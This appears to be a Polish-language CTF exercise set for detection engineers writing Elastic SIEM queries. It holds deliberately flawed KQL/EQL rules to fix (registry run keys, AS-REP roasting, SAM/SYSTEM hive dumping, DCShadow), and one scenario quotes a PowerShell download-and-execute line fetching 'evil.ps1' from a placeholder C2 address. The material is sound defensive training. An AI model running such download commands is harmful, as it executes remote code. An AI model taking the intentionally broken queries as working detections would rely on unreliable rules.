# 15 zadań dla Inżyniera Detekcji

## Zadania typu CTF dla analityków dotyczące Inżynierii Detekcji w Elastic SIEM
Zadania utworzone w ramach tego CTF-a zostały utworzone na potrzeby zwiększenia stanu wiedzy i umiejętności w ramach tworzenia zapytań w Elastic SIEM, które mogą tworzyć reguły detekcji.

Zadania zostały podzielone na następujące kategorie:
- zapytania do poprawy
- zapytania do wytworzenia
- zapytania do adaptacji

Zachęcam do próby odpowiedzi na wszystkie zadania. Nie ma jedynych właściwych odpowiedzi, niektóre zadania mogą być podchwytliwe i będą wymagać niestandardowej odpowiedzi. Zachęcam do opisania swojego procesu myślowego, zaprezentowania dlaczego coś zostało zrobione tak, a nie inaczej. Celem nie jest wytworzenie perfekcyjnego zapytania, a sprawdzenie jak wnioskujesz, prowadzisz research i stosujesz swoją wiedzę. Reguły powinny stosować się ogólnie do detekcji w środowiskach enterprise. Dla niektórych przypadków możesz zaproponować wiele reguł.

Zapytania mogą być napisane w językach KQL, Lucene lub EQL - spróbuj zargumentować dlaczego wybrany został ten język, a nie inny.

Jeśli nie jesteś pewny składni - odwołuj się do dokumentacji ze strony elastic.co

## Pomocna dokumentacja
- [EQL syntax reference](https://www.elastic.co/guide/en/elasticsearch/reference/current/eql-syntax.html)
- [EQL search ](https://www.elastic.co/guide/en/elasticsearch/reference/current/eql.html) 
- [Kibana Query Language](https://www.elastic.co/guide/en/kibana/current/kuery-query.html)
- [Lucene query syntax](https://www.elastic.co/guide/en/kibana/current/lucene-query.html)
- [Elastic ECS Field Reference](https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html)

## Podpowiedzi
Przy realizacji zadań zwróć uwagę na następujące elementy:

- Czy w zapytaniu wykorzystywane są odpowiednie pola? Jaki jest typ tego pola wg. ECS?
- Jaki dziennik zdarzeń systemu powinien zostać wybrany do wykonania zapytania?
- Czy wielkość liter w zapytaniu ma znaczenie?
- Czy da się zminimalizować liczbę wildcardów oraz użycia wyrażeń regularnych?
- Czy wykorzystane zapytanie może być w prosty sposób ominięte przez atakującego?
- Jeżeli nie znasz techniki względem której prowadzona jest detekcja, spróbuj zgłębić jej działanie.
- Tytuł reguły i jej opis jest niezmienny.
- Nie musisz tworzyć reguły. Odpowiedzią jest zapytanie, które mogło by tworzyć regułę
- Zapytania typu KQL/Lucene możesz testować w Kibana/Analytics/Discover. Zapytania typu EQL możesz testować w Kibana/Security/Timelines/Correlation

## Odpowiedzi
Odpowiedzią jest tylko zapytanie w odpowiednim języku zapytań oraz ewentualny krótki opis dlaczego tak, a nie inaczej. Nie musisz tworzyć reguły, wystarczy optymalne zapytanie. 

## Zadania

### zapytania do poprawy
W poniższych regułach elementy takie jak logika, składnia lub wykorzystanie języka są niepoprawne. Spróbuj znaleźć błędy i je poprawić. Tytuł reguły oraz jej opis stanowią co reguła powinna wykrywać. 

#### Zadanie 1
##### Title: Registry Add Run Key Persistence
##### Description: Detects suspicious command line execution monitoring modifications to the run key in the Registry Hive
```EQL
any where process.command_line regex "reg.*ADD.*SOFTWARE\\\\Microsoft\\\\CurrentVersion\\\\Run.*"
```

#### Zadanie 2
##### Title: Suspicious Scheduled Task Persistence
##### Description: Detects suspicious scheduled tasks created for persistence
```KQL
process.command_line : (*schtasks* and *create*)
```

#### Zadanie 3
##### Title: ASReproasting Attack Using Powershell
##### Description: Detects Invoke-ASREPRoast usage in powershell to perform AS-REP Roasting attack.
```KQL
process.name : "powershell.exe" and process.command_line : "Invoke-ASREPRoast"
```

#### Zadanie 4
##### Title: Windows Service Created with Binary in Suspicious Directory  
##### Description: Detects creation of the Windows Service in on of the suspicious directories: C:\ProgramData, C:\Users\Public or C:\TEMP
```KQL
process.args : ("sc.exe" and "binPath=" and (*ProgramData* or *Public* or *Temp*))
```

#### Zadanie 5
##### Title: Unusual Network Activity by Processes on Kerberos Port
##### Description: Detects unusual Windows Processes doing network connections on Kerberos port
```KQL
destination.port : 445 and not process.name : lsass.exe
```

#### Zadanie 6
##### Title: Dumping Sensitive Hive Registries using Reg Utility
##### Description: Detects the usage the reg.exe utility to dump one of the sensitive registries: SAM, SECURITY or SYSTEM
```EQL
any where process.executable like "*reg.exe" and process.command_line like "*save*" and process.args in ("SYSTEM", "SAM", "SECURITY")
```

#### Zadanie 7
##### Title: DCShadow
##### Description: Detects creation of a rogue domain controller
#####
```EQL
any where
(event.code == "4742" and (winlog.event_data.ServicePrincipalNames : ("*E3514235–4B06–11D1-AB04–00C04FC2DCD2*") and winlog.event_data.ServicePrincipalNames : "*GC/*/*"))
or (event.code == "5136" and winlog.event_data.AttributeLDAPDisplayName :"servicePrincipalName" and (winlog.event_data.AttributeValue : ("*E3514235–4B06–11D1-AB04–00C04FC2DCD2*") and winlog.event_data.AttributeValue : "*GC/*/*")) 
or event.code == "5137" 
or (event.code in ("4929", "5141"))
```

### Zapytania do adaptacji
Poniżej zamieszczono kilka reguł detekcji w metodologii Sigma.
Zaproponuj skuteczną implementację zapytań w Elastic.

#### Zadanie 8
[PsExec Pipes Artifacts](https:///github.com/SigmaHQ/sigma/blob/master/deprecated/windows/pipe_created_psexec_pipes_artifacts.yml)

#### Zadanie 9
[Suspicious PowerShell Get Current User](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_current_user.yml)

#### Zadanie 10
[Path To Screensaver Binary Modified](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_event/registry_event_modify_screensaver_binary_path.yml)

### Zapytania do wytworzenia
Poniżej umieszczono kilka raportów lub sugestii detekcji. Przenalizuj je pod kątem możliwości wytworzenia reguł detekcji i stwórz zapytania.

#### Zadanie 11
Detekcja stworzenie konta użytkownika, a następnie jego usunięcie w ciągu maksymalnie jednej minuty.

#### Zadanie 12
Na podstawie informacji od partnera wiemy, że klaster aktywności "Dirty Blizzard" poszukuje w Internecie serwerów z wystawionym protokołem RDP. Partnerzy informują, że wśród ofiar mogą być organizacje związane z wojskiem.
Twoim zadaniem jest napisanie reguły bezpieczeńśtwa, która wykryje udane logowanie na serwer z uzyciem protokołu RDP z Internetu.

#### Zadanie 13
Ze źródła którego nie możemy ujawnić dowiedzieliśmy się że klaster aktywności "Sunny Boys" wysyła do naszych pracowników z użyciem komunikatora Signal złośliwe pliki związane z pakietem office: Word, PowerPoint oraz Excel. Złośliwe pliki mają starszy format, kompatybilny z 97-2003. Wysyłane pliki mają nazwę w formacie "Dekret_XXXX", gdzie XXXX jest losową liczbą. Pliki te zawierają złośliwe makro VBS, które powoduje uruchomienie automatycznie PowerShella z parametrami `IEX (iwr 'http://ADRES_IP_C2/evil.ps1')`. Nie wiemy co dalej robi pobrany skrypt PowerShell.

#### Zadanie 14
Przeanalizuj [raport nr. 1](https://tria.ge/241015-l98snsyeje/behavioral2): 
SHA256: 939f509a8edc6b9da103fbcebe85630671ed591dd9e40243da37559e10dcfd80, platforma TRIA.GE

Zidentyfikuj możliwości zaimplementowania reguł bezpieczeństwa wykrywających TTP implementowane przez próbkę. Skup się na TTP dotyczących systemu Windows.
Zaimplementuj zapytania, które według Ciebie są najistotniejsze.

#### Zadanie 15
Przeanalizuj [raport nr. 2](https://tria.ge/241102-1hhvhawenh/behavioral1):
SHA256: bdc7b917477bb49af7a5b06e5d9ed20e08fed25944f297a6b36a50d03d8a5777, platforma TRIA.GE

Zidentyfikuj możliwości zaimplementowania reguł bezpieczeństwa wykrywających TTP implementowane przez próbkę. Skup się na TTP dotyczących systemu Windows.
Zaimplementuj zapytania, które według Ciebie są najistotniejsze.
